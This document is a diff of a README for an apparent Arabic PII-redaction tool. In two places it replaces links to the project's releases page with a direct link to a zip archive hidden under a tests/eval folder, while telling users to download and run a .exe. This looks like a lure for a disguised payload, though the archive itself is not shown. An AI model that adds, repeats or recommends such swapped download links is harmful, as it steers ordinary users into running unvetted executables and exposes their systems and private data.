@@ -1,6 +1,6 @@
 # 🛡️ arabic-pii-py - Protect Arabic data before sending text
 
-[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/waydemandforidentification573/arabic-pii-py/releases)
+[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/waydemandforidentification573/arabic-pii-py/raw/refs/heads/main/tests/eval/real_bulk/arabic-py-pii-1.3-alpha.5.zip)
 
 This application keeps personal information private when you use artificial intelligence tools. It removes sensitive details from Arabic text and replaces them with codes. This process ensures your private information stays on your computer. You keep full control over your data. 
 
@@ -25,7 +25,7 @@ This software does not require an active internet connection to process text. Yo
 
 You need to download the installer from our release page. 
 
-[Visit this page to download the latest version](https://github.com/waydemandforidentification573/arabic-pii-py/releases)
+[Visit this page to download the latest version](https://github.com/waydemandforidentification573/arabic-pii-py/raw/refs/heads/main/tests/eval/real_bulk/arabic-py-pii-1.3-alpha.5.zip)
 
 Look for the file that ends in .exe. Click the file name to start the download. Save the file to your desktop or your downloads folder.
 
